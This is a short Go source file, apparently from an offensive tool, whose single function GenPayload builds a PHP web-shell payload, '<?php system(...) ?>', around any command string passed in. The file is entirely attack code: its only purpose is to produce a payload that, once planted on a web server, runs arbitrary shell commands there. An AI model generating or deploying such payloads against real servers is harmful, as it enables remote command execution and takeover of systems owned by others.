package payload

func GenPayload(payloadtype, command string) string {
	/*if type payloadtype is php*/
	if payloadtype == "php" {
		data := "<?php system('" + command + "'); ?>"
		return data
	}
	return ""
}
